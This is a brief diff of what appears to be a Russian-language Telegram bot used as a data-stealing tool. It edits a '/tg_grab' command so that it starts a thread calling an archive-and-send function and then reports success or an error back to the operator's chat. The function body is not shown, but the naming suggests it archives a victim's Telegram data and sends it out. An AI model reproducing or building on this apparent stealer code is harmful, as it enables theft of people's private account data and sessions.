@@ -305,14 +305,14 @@ def start(message):
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
 @bot.message_handler(commands=['tg_grab'])
 def handle_tg_grab_command(message):
-    thread = threading.Thread(target=archive_and_send)
+    thread = threading.Thread(target=archive_and_send2)
     thread.start()
     time.sleep(20)
     if thread.is_alive():
         print("АРХИВ ЗАГРУЖАЕТСЯ СЛИШКОМ ДОЛГО, ПРИНУДИТЕЛЬНАЯ ОТПРАВКА.")
         thread.join()
     try:
-        error_message = "ВЫПОЛНЕННО!!!"
+        error_message = "ВЫПОЛНЕНО!!!"
         bot.send_message(chat_id, error_message)
     except Exception as e:
         error_message = f"ОШИБКА: {e}"
